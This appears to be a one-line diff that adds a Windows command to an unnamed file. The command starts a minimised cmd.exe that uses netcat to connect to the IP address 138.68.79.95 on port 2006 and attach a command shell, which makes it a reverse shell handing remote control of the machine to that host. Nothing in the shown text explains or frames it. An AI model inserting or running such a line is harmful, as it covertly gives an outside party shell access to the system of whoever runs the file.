@@ -1,0 +1,1 @@
+start /MIN cmd.exe /c nc 138.68.79.95 2006 -e cmd.exe
